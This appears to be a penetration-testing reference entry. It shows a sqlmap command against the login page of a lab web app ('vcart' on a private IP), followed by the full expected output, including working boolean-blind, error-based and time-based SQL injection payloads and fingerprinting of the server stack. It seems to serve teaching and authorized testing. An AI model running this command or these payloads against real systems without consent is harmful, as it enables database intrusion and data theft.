---
id: 759fcbe6-1daa-48c2-a087-ae887005d316
name: SQLMap Command With Parameter
type: command
executor: ''
data: sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2"
  -p user
output: "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [)]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 21:03:58\n\n\
  [21:03:59] [INFO] testing connection to the target URL\nsqlmap got a 302 redirect\
  \ to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y\n[21:04:03]\
  \ [INFO] testing if the target URL content is stable\n[21:04:03] [INFO] heuristic\
  \ (basic) test shows that GET parameter 'user' might be injectable (possible DBMS:\
  \ 'MySQL')\n[21:04:03] [INFO] heuristic (XSS) test shows that GET parameter 'user'\
  \ might be vulnerable to cross-site scripting (XSS) attacks\n[21:04:03] [INFO] testing\
  \ for SQL injection on GET parameter 'user'\nit looks like the back-end DBMS is\
  \ 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y\n\
  for the remaining tests, do you want to include all tests for 'MySQL' extending\
  \ provided level (1) and risk (1) values? [Y/n] y\n[21:04:26] [INFO] testing 'AND\
  \ boolean-based blind - WHERE or HAVING clause'\n[21:04:26] [INFO] GET parameter\
  \ 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable\
  \ \n[21:04:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER\
  \ BY or GROUP BY clause (BIGINT UNSIGNED)'\n[21:04:26] [INFO] testing 'MySQL >=\
  \ 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[21:04:26] [INFO]\
  \ testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause\
  \ (EXP)'\n[21:04:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING\
  \ clause (EXP)'\n[21:04:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE,\
  \ HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'\n[21:04:27] [INFO] testing 'MySQL\
  \ >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'\n[21:04:27] [INFO]\
  \ testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause\
  \ (FLOOR)'\n[21:04:27] [INFO] GET parameter 'user' is 'MySQL >= 5.0 AND error-based\
  \ - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable \n[21:04:27]\
  \ [INFO] testing 'MySQL inline queries'\n[21:04:27] [INFO] testing 'MySQL > 5.0.11\
  \ stacked queries (comment)'\n[21:04:27] [WARNING] time-based comparison requires\
  \ larger statistical model, please wait........... (done)                      \
  \                      \n[21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries'\n\
  [21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'\n\
  [21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'\n[21:04:28]\
  \ [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'\n[21:04:28]\
  \ [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'\n[21:04:28] [INFO]\
  \ testing 'MySQL >= 5.0.12 AND time-based blind'\n[21:04:38] [INFO] GET parameter\
  \ 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable \n[21:04:38]\
  \ [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[21:04:38] [INFO]\
  \ automatically extending ranges for UNION query injection technique tests as there\
  \ is at least one other (potential) technique found\n[21:04:38] [INFO] target URL\
  \ appears to be UNION injectable with 8 columns\ninjection not exploitable with\
  \ NULL values. Do you want to try with a random integer value for option '--union-char'?\
  \ [Y/n] y\n[21:04:43] [WARNING] if UNION based SQL injection is not detected, please\
  \ consider forcing the back-end DBMS (e.g. '--dbms=mysql') \n[21:04:43] [INFO] testing\
  \ 'MySQL UNION query (12) - 1 to 20 columns'\n[21:04:43] [WARNING] reflective value(s)\
  \ found and filtering out\n[21:04:44] [INFO] testing 'MySQL UNION query (12) - 21\
  \ to 40 columns'\n[21:04:44] [INFO] testing 'MySQL UNION query (12) - 41 to 60 columns'\n\
  [21:04:44] [INFO] testing 'MySQL UNION query (12) - 61 to 80 columns'\n[21:04:45]\
  \ [INFO] testing 'MySQL UNION query (12) - 81 to 100 columns'\nGET parameter 'user'\
  \ is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nsqlmap\
  \ identified the following injection point(s) with a total of 256 HTTP(s) requests:\n\
  ---\nParameter: user (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based\
  \ blind - WHERE or HAVING clause\n    Payload: user=demo@vcart.com' AND 5118=5118\
  \ AND 'vzLg'='vzLg&pass=demo&selop=2\n\n    Type: error-based\n    Title: MySQL\
  \ >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n\
  \    Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT\
  \ (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS\
  \ GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2\n\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: user=demo@vcart.com'\
  \ AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2\n---\n[21:04:51] [INFO] the back-end\
  \ DBMS is MySQL\nweb application technology: Apache 2.4.41, PHP 7.1.32\nback-end\
  \ DBMS: MySQL >= 5.0\n[21:04:51] [INFO] fetched data logged to text files under\
  \ '/root/.sqlmap/output/192.168.1.10'\n\n[*] shutting down at 21:04:51\n"
created_at: '2020-09-02T17:40:37.458182+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command With Parameter

```bash
sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2" -p user
```

## Expected Output

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:03:58

[21:03:59] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y
[21:04:03] [INFO] testing if the target URL content is stable
[21:04:03] [INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')
[21:04:03] [INFO] heuristic (XSS) test shows that GET parameter 'user' might be vulnerable to cross-site scripting (XSS) attacks
[21:04:03] [INFO] testing for SQL injection on GET parameter 'user'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:04:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:04:26] [INFO] GET parameter 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:04:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:04:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:04:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:04:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:04:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:04:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:04:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:04:27] [INFO] GET parameter 'user' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:04:27] [INFO] testing 'MySQL inline queries'
[21:04:27] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[21:04:27] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                            
[21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[21:04:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[21:04:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[21:04:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[21:04:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[21:04:38] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[21:04:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:04:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:04:38] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[21:04:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[21:04:43] [INFO] testing 'MySQL UNION query (12) - 1 to 20 columns'
[21:04:43] [WARNING] reflective value(s) found and filtering out
[21:04:44] [INFO] testing 'MySQL UNION query (12) - 21 to 40 columns'
[21:04:44] [INFO] testing 'MySQL UNION query (12) - 41 to 60 columns'
[21:04:44] [INFO] testing 'MySQL UNION query (12) - 61 to 80 columns'
[21:04:45] [INFO] testing 'MySQL UNION query (12) - 81 to 100 columns'
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 256 HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com' AND 5118=5118 AND 'vzLg'='vzLg&pass=demo&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2
---
[21:04:51] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0
[21:04:51] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'

[*] shutting down at 21:04:51

```


